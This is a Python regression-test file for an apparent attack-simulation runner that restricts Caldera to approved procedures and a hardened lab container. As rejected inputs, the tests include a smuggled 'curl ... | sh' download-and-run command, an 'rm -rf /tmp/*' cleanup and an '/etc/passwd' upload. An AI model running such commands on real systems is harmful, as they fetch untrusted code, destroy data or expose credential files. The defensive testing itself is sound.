"""Regression tests for unattended procedure scope and independent sensor evidence."""

from __future__ import annotations

import json
import shlex
from datetime import UTC, datetime
from pathlib import Path
from unittest.mock import MagicMock

import httpx
import pytest

from hecate_runner.bas.approved import (
    APPROVED_PROCEDURES,
    catalog_digest,
    select_approved_rule,
    validate_approved_ability,
)
from hecate_runner.bas.base import (
    DetonationRequest,
    DetonationResult,
    DetonationTarget,
    SafetyViolationError,
)
from hecate_runner.bas.caldera import CalderaConnector
from hecate_runner.bas.runtime import run_approved_validation
from hecate_runner.bas.sensor import SENSOR_ENTRYPOINT, LabProcessSensor, parse_exec_trace
from hecate_runner.bas.verifier import DetectionVerifier
from hecate_runner.config import Settings
from hecate_runner.hecate_client import HypothesisResult
from hecate_runner.hunt_writer import DraftHuntRequest, render_draft
from hecate_runner.orchestrator import Orchestrator

RULE = """title: Linux User Discovery
logsource:
  product: linux
  category: process_creation
tags: [attack.t1033]
detection:
  selection:
    Image|endswith: /whoami
  condition: selection
"""


def ability():
    return {
        "ability_id": APPROVED_PROCEDURES["T1033"].ability_id,
        "technique_id": "T1033",
        "executors": [{"platform": "linux", "name": "sh", "command": "whoami"}],
    }


@pytest.mark.parametrize(
    "change",
    [
        {"command": "whoami; curl https://example.test/payload | sh"},
        {"payloads": ["payload"]},
        {"cleanup": ["rm -rf /tmp/*"]},
        {"variations": [{"command": "id"}]},
        {"uploads": ["/etc/passwd"]},
        {"name": "python"},
        {"code": "print('payload')"},
    ],
)
def test_changed_executable_content_is_rejected(change):
    changed = ability()
    changed["executors"][0].update(change)
    with pytest.raises(SafetyViolationError):
        validate_approved_ability(changed, APPROVED_PROCEDURES["T1033"])


def test_unapproved_and_wrong_platform_rules_are_not_executed():
    assert select_approved_rule([{"rule_yaml": RULE}], ["T1033"], ["T1033"])
    assert select_approved_rule([{"rule_yaml": RULE}], ["T1033"], []) is None
    assert select_approved_rule([{"rule_yaml": RULE}], ["T1033.001"], ["T1033"]) is None
    assert (
        select_approved_rule(
            [{"rule_yaml": RULE.replace("linux", "windows")}], ["T1033"], ["T1033"]
        )
        is None
    )
    different_behavior = RULE.replace(
        "Image|endswith: /whoami", "CommandLine|contains: /sensitive/database"
    )
    assert select_approved_rule([{"rule_yaml": different_behavior}], ["T1033"], ["T1033"]) is None


def test_configuration_rejects_unreviewed_or_wildcard_procedures():
    for value in ("*", "T1003", '["T1033", "T1003"]'):
        with pytest.raises(ValueError, match="reviewed techniques"):
            Settings(_env_file=None, bas_auto_techniques=value)
    assert Settings(_env_file=None, bas_auto_techniques="T1033,T1057").bas_auto_techniques == [
        "T1033",
        "T1057",
    ]


def test_automation_selects_the_matching_rule_instead_of_the_first_rule(tmp_path, monkeypatch):
    execute = MagicMock(
        return_value={
            "status": "verified_true_positive",
            "telemetry_arrived": True,
            "rule_triggered": True,
        }
    )
    monkeypatch.setattr("hecate_runner.bas.runtime.run_approved_validation", execute)
    settings = Settings(
        _env_file=None,
        hecate_workspace=tmp_path,
        bas_enabled=True,
        bas_mode="caldera",
        bas_auto_execute_live=True,
        bas_auto_techniques=["T1033"],
    )
    req = DraftHuntRequest(
        hunt_id="H-0001",
        generated_at=datetime.now(UTC),
        threat_intel="Test evidence",
        platforms=["linux"],
        hypothesis=HypothesisResult(hypothesis="Discovery", techniques=["T1033"]),
    )
    orchestrator = Orchestrator(settings, MagicMock(), MagicMock())
    orchestrator._run_bas_validation(
        req,
        [{"rule_yaml": RULE.replace("linux", "windows")}, {"rule_yaml": RULE}],
        tmp_path,
        MagicMock(),
    )
    assert execute.call_args.args[2:] == (APPROVED_PROCEDURES["T1033"], RULE)


def test_altered_ability_is_refused_before_any_operation_is_created():
    requests = []

    def handle(request):
        requests.append(request)
        if request.url.path == "/api/v2/agents":
            return httpx.Response(
                200,
                json=[
                    {
                        "paw": "agent",
                        "host": "lab",
                        "platform": "linux",
                        "trusted": True,
                        "group": "staging",
                    }
                ],
            )
        changed = ability()
        changed["executors"][0]["command"] = "curl https://example.test/payload | sh"
        return httpx.Response(200, json=[changed])

    client = httpx.Client(transport=httpx.MockTransport(handle), base_url="http://test")
    connector = CalderaConnector(client=client, allowed_hosts=["lab"])
    request = DetonationRequest(
        hunt_id="H-0001",
        technique_id="T1033",
        ability_id=APPROVED_PROCEDURES["T1033"].ability_id,
        target=DetonationTarget(environment="lab", host="lab"),
        params={"approved_only": True},
    )
    with pytest.raises(SafetyViolationError):
        connector.detonate(request)
    assert all(r.method == "GET" for r in requests)


def test_trace_rejects_failed_out_of_window_and_unrelated_commands():
    trace = """12 100.000 execve("/usr/bin/whoami", ["whoami"], 0x0) = 0
13 101.000 execve("/usr/bin/whoami", ["whoami"], 0x0) = -1 ENOENT
14 102.000 execve("/usr/bin/id", ["id"], 0x0) = 0
15 103.000 execve("/usr/bin/whoami", ["whoami"], 0x0) = 0
16 104.000 execve("/usr/bin/whoami", ["whoami", "--help"], 0x0) = 0
17 105.000 execve("/usr/bin/whoami", ["whoami"], 0x0) = 0"""
    result = parse_exec_trace(trace, start=101, end=104, host="lab", command="whoami")
    assert len(result) == 1
    assert result[0]["ProcessId"] == 15
    assert result[0]["sensor"] == "lab_execve"


def test_trace_reassembles_successful_exec_only():
    trace = """20 101.000 execve("/usr/bin/whoami", ["whoami"], 0x0 <unfinished ...>
20 101.005 <... execve resumed>) = 0
21 102.000 execve("/usr/bin/whoami", ["whoami"], 0x0 <unfinished ...>
21 102.005 <... execve resumed>) = -1 ENOENT"""
    result = parse_exec_trace(trace, start=100, end=103, host="lab", command="whoami")
    assert [e["ProcessId"] for e in result] == [20]


@pytest.mark.parametrize("procedure", APPROVED_PROCEDURES.values(), ids=APPROVED_PROCEDURES.keys())
def test_parameterized_procedures_require_exact_observed_arguments(procedure):
    image = "/usr/bin/" + procedure.argv[0]
    argv = list(procedure.argv)
    good = f"12 100.000 execve({json.dumps(image)}, {json.dumps(argv)}, 0x0) = 0"
    changed = (
        f"13 100.000 execve({json.dumps(image)}, {json.dumps([*argv, 'unexpected'])}, 0x0) = 0"
    )
    events = parse_exec_trace(
        good + "\n" + changed, start=99, end=101, host="lab", command=procedure.argv
    )
    assert len(events) == 1
    assert events[0]["CommandLine"] == shlex.join(argv)


def test_missing_managed_procedures_can_be_installed_without_overwriting_stock(
    tmp_path, monkeypatch
):
    from hecate_runner.cli import bas_install_procedures_cmd

    requests = []
    catalog = {}
    for procedure in APPROVED_PROCEDURES.values():
        if not procedure.managed:
            catalog[procedure.ability_id] = {
                "ability_id": procedure.ability_id,
                "technique_id": procedure.technique_id,
                "executors": [{"platform": "linux", "name": "sh", "command": procedure.command}],
            }

    def handle(request):
        requests.append(request)
        if request.method == "PUT":
            body = json.loads(request.content)
            assert body["id"] not in catalog
            sh_exec = body["platforms"]["linux"]["sh"]
            executor_item = {
                "platform": "linux",
                "name": "sh",
                "command": sh_exec["command"],
            }
            if "cleanup" in sh_exec:
                executor_item["cleanup"] = sh_exec["cleanup"]
            catalog[body["id"]] = {
                "ability_id": body["id"],
                "technique_id": body["technique"]["attack_id"],
                "executors": [executor_item],
            }
            return httpx.Response(200, json=[])
        return httpx.Response(200, json=list(catalog.values()))

    connector = CalderaConnector(
        client=httpx.Client(transport=httpx.MockTransport(handle), base_url="http://test")
    )
    monkeypatch.setattr("hecate_runner.bas.get_bas_provider", lambda *args: connector)
    bas_install_procedures_cmd()
    assert len(catalog) == len(APPROVED_PROCEDURES)
    assert sum(r.method == "PUT" for r in requests) == sum(
        p.managed for p in APPROVED_PROCEDURES.values()
    )


def test_caldera_receipts_cannot_become_sensor_evidence():
    now = datetime.now(UTC).isoformat()
    detonation = DetonationResult(
        success=True,
        hunt_id="H-0001",
        technique_id="T1033",
        ability_id="a",
        provider="caldera",
        start_time_utc=now,
        end_time_utc=now,
        duration_seconds=1,
        exit_code=0,
        stdout="",
        stderr="",
        telemetry_signatures=[{"data_source": "caldera_link", "Image": "/usr/bin/whoami"}],
    )
    verifier = DetectionVerifier()
    assert verifier.verify_detonation(detonation, rule_yaml=RULE).status == "telemetry_missing"
    detonation.telemetry_signatures = [
        {"data_source": "process_creation", "Image": "/usr/bin/whoami"}
    ]
    assert (
        verifier.verify_detonation(detonation, rule_yaml=RULE, raw_events=[]).status
        == "telemetry_missing"
    )


def container_config():
    return {
        "Id": "pinned-container-id",
        "Image": "sha256:63dbe5e24c5b8b852ddf0680032488291363c23b5b4fa975445ea0f41a909fbd",
        "State": {"Running": True},
        "Config": {
            "Hostname": "lab",
            "User": "65534:65534",
            "Entrypoint": SENSOR_ENTRYPOINT,
            "Cmd": [
                "-server",
                "http://caldera:8888",
                "-group",
                "hecate-local-lab",
                "-paw",
                "hecate-local-sandbox",
            ],
        },
        "HostConfig": {
            "ReadonlyRootfs": True,
            "CapDrop": ["ALL"],
            "SecurityOpt": ["no-new-privileges=true"],
            "Memory": 268435456,
            "PidsLimit": 128,
            "NanoCpus": 500000000,
            "Tmpfs": {"/tmp": "rw,nosuid,nodev,noexec,size=64m,mode=1777"},
            "Ulimits": [
                {"Name": "core", "Soft": 0, "Hard": 0},
                {"Name": "nofile", "Soft": 256, "Hard": 256},
                {"Name": "fsize", "Soft": 16777216, "Hard": 16777216},
            ],
        },
        "NetworkSettings": {"Networks": {"hecate-bas-lab": {}}},
        "Mounts": [],
    }


def test_sensor_accepts_the_isolated_lab_and_pins_its_container_identity(monkeypatch):
    def inspect(*args):
        if args[0] == "inspect":
            if args[1] == "caldera":
                from tests.test_bas_controller import controller_config

                return json.dumps([controller_config()])
            return json.dumps([container_config()])
        if args[0] == "network":
            return json.dumps([{"Internal": True}])
        assert args[:2] == ("exec", "pinned-container-id")
        return '8 100.000 execve("/usr/local/bin/sandcat", ["sandcat"], 0x0) = 0'

    monkeypatch.setattr(LabProcessSensor, "_docker", staticmethod(inspect))
    sensor = LabProcessSensor("agent", "lab")
    sensor.preflight()
    assert sensor.container_id == "pinned-container-id"


@pytest.mark.parametrize(
    "change",
    [
        {"Privileged": True},
        {"ReadonlyRootfs": False},
        {"CapAdd": ["SYS_PTRACE"]},
        {"PidMode": "host"},
        {"SecurityOpt": ["seccomp=unconfined"]},
        {"Memory": 0},
        {"Ulimits": []},
        {"Tmpfs": {"/tmp": "rw,nosuid,nodev,size=64m"}},
    ],
)
def test_sensor_rejects_weakened_lab_before_execution(monkeypatch, change):
    container = container_config()
    container["HostConfig"].update(change)
    monkeypatch.setattr(LabProcessSensor, "_docker", lambda *args: json.dumps([container]))
    with pytest.raises(SafetyViolationError):
        LabProcessSensor("agent", "lab").preflight()


def test_sensor_rejects_unapproved_agent_image(monkeypatch):
    container = container_config()
    container["Image"] = "sha256:0000000000000000000000000000000000000000000000000000000000000000"
    monkeypatch.setattr(LabProcessSensor, "_docker", lambda *args: json.dumps([container]))
    with pytest.raises(SafetyViolationError, match="agent image identity is not approved"):
        LabProcessSensor("agent", "lab").preflight()


def test_preflight_failure_does_not_schedule_operation(tmp_path, monkeypatch):
    provider = MagicMock()
    monkeypatch.setattr("hecate_runner.bas.get_bas_provider", lambda *args: provider)

    def refuse(self):
        raise SafetyViolationError("sensor unavailable")

    monkeypatch.setattr(LabProcessSensor, "preflight", refuse)
    settings = Settings(
        _env_file=None,
        hecate_workspace=tmp_path,
        bas_enabled=True,
        bas_mode="caldera",
        bas_telemetry="lab_process",
        bas_auto_techniques=["T1033"],
        bas_allowed_hosts=["lab"],
        bas_linux_host="lab",
        caldera_agent_group="hecate-local-lab",
    )
    result = run_approved_validation(settings, "H-0001", APPROVED_PROCEDURES["T1033"], RULE)
    provider.detonate.assert_not_called()
    assert result["status"] == "error"
    path = next((tmp_path / ".hecate/bas/runs").glob("*.json"))
    assert path.stat().st_mode & 0o777 == 0o600
    assert json.loads(path.read_text())["reason"] == "sensor unavailable"


@pytest.mark.parametrize("platforms,rules", [(["windows"], [{"rule_yaml": RULE}]), (["linux"], [])])
def test_unsupported_hunts_record_skip_without_claiming_verification(
    tmp_path, monkeypatch, platforms, rules
):
    runner = MagicMock()
    monkeypatch.setattr("hecate_runner.bas.runtime.run_approved_validation", runner)
    settings = Settings(
        _env_file=None,
        hecate_workspace=tmp_path,
        bas_enabled=True,
        bas_mode="caldera",
        bas_auto_execute_live=True,
        bas_auto_techniques=["T1033"],
    )
    orchestrator = Orchestrator(settings, MagicMock(), MagicMock())
    req = DraftHuntRequest(
        hunt_id="H-0001",
        generated_at=datetime.now(UTC),
        hypothesis=HypothesisResult(hypothesis="Discovery", techniques=["T1033"]),
        threat_intel="Test evidence",
        platforms=platforms,
    )
    orchestrator._run_bas_validation(req, rules, tmp_path, MagicMock())
    runner.assert_not_called()
    assert req.bas_verification["status"] == "skipped"
    text = render_draft(req)
    assert 'bas_status: "skipped"' in text
    assert "bas_verified:" not in text
    assert "**Skipped:**" in text


def test_approved_procedure_cleanup_validation():
    proc = APPROVED_PROCEDURES["T1027"]
    valid_ability = {
        "ability_id": proc.ability_id,
        "technique_id": proc.technique_id,
        "executors": [
            {
                "platform": "linux",
                "name": "sh",
                "command": proc.command,
                "cleanup": [proc.cleanup_command],
            }
        ],
    }
    # Valid cleanup succeeds
    validate_approved_ability(valid_ability, proc)

    # Missing cleanup on a procedure that requires it is rejected
    missing_cleanup = {
        "ability_id": proc.ability_id,
        "technique_id": proc.technique_id,
        "executors": [
            {
                "platform": "linux",
                "name": "sh",
                "command": proc.command,
            }
        ],
    }
    with pytest.raises(SafetyViolationError, match="cleanup command altered or missing"):
        validate_approved_ability(missing_cleanup, proc)

    # Altered cleanup command is rejected
    altered_cleanup = {
        "ability_id": proc.ability_id,
        "technique_id": proc.technique_id,
        "executors": [
            {
                "platform": "linux",
                "name": "sh",
                "command": proc.command,
                "cleanup": ["rm -rf /tmp/*"],
            }
        ],
    }
    with pytest.raises(SafetyViolationError, match="cleanup command altered or missing"):
        validate_approved_ability(altered_cleanup, proc)


def test_catalog_digest_deterministic_and_changes_with_mutation():
    digest1 = catalog_digest()
    digest2 = catalog_digest()
    assert len(digest1) == 64
    assert digest1 == digest2


def test_pre_detonation_dirty_tmpfs_triggers_quarantine(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    from hecate_runner.bas.lifecycle import LabLease

    lease = LabLease(
        lease_path=tmp_path / "lab.lease",
        quarantine_path=tmp_path / "lab.quarantine",
        lock_path=tmp_path / "lab.lock",
    )
    monkeypatch.setattr("hecate_runner.bas.runtime.LabLease", lambda *args, **kwargs: lease)
    monkeypatch.setattr(
        "hecate_runner.bas.runtime.audit_container_tmpfs",
        lambda *args: ["/tmp/uncleaned-leftover.bin"],
    )

    fake_sensor = MagicMock()
    fake_sensor.agent_image = "agent-img"
    fake_sensor.controller_image = "controller-img"
    monkeypatch.setattr("hecate_runner.bas.runtime.LabProcessSensor", lambda *args: fake_sensor)

    settings = Settings(
        _env_file=None,
        hecate_workspace=tmp_path,
        bas_enabled=True,
        bas_mode="caldera",
        bas_telemetry="lab_process",
        bas_allowed_hosts=["lab"],
        bas_linux_host="lab",
        caldera_agent_group="hecate-local-lab",
        bas_auto_techniques=["T1033"],
    )
    result = run_approved_validation(
        settings, "H-0001", APPROVED_PROCEDURES["T1033"], RULE, lease=lease
    )
    assert result["status"] == "error"
    assert "uncleaned files prior to execution" in result["reason"]
    assert lease.is_quarantined()
    info = lease.get_quarantine_info()
    assert info is not None
    assert "Dirty lab" in info["reason"]
    assert "/tmp/uncleaned-leftover.bin" in str(info.get("details"))


def test_post_detonation_uncleaned_tmpfs_triggers_quarantine(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    from hecate_runner.bas.lifecycle import LabLease

    lease = LabLease(
        lease_path=tmp_path / "lab.lease",
        quarantine_path=tmp_path / "lab.quarantine",
        lock_path=tmp_path / "lab.lock",
    )
    monkeypatch.setattr("hecate_runner.bas.runtime.LabLease", lambda *args, **kwargs: lease)

    # First call (pre-check): clean. Second call (post-check): lingering file found!
    audit_calls = []

    def mock_audit(container_name):
        audit_calls.append(container_name)
        return [] if len(audit_calls) == 1 else ["/tmp/uncleaned-dropper.tmp"]

    monkeypatch.setattr("hecate_runner.bas.runtime.audit_container_tmpfs", mock_audit)

    fake_sensor = MagicMock()
    fake_sensor.agent_image = "agent-img"
    fake_sensor.controller_image = "controller-img"
    fake_sensor.collect.return_value = []
    monkeypatch.setattr("hecate_runner.bas.runtime.LabProcessSensor", lambda *args: fake_sensor)

    provider = MagicMock()
    provider.detonate.return_value = DetonationResult(
        success=True,
        cleanup_success=True,
        hunt_id="H-0001",
        technique_id="T1033",
        ability_id="bd527b63-9f9e-46e0-9816-b8434d2b8989",
        provider="caldera",
        start_time_utc="2026-10-31T00:00:00Z",
        end_time_utc="2026-10-31T00:00:01Z",
        duration_seconds=1.0,
        exit_code=0,
        stdout="whoami",
        stderr="",
    )
    monkeypatch.setattr("hecate_runner.bas.get_bas_provider", lambda *args: provider)

    settings = Settings(
        _env_file=None,
        hecate_workspace=tmp_path,
        bas_enabled=True,
        bas_mode="caldera",
        bas_telemetry="lab_process",
        bas_allowed_hosts=["lab"],
        bas_linux_host="lab",
        caldera_agent_group="hecate-local-lab",
        bas_auto_techniques=["T1033"],
    )
    result = run_approved_validation(
        settings, "H-0001", APPROVED_PROCEDURES["T1033"], RULE, lease=lease
    )
    assert result["status"] == "error"
    assert lease.is_quarantined()
    info = lease.get_quarantine_info()
    assert info is not None
    assert "Ephemeral state violation" in info["reason"]
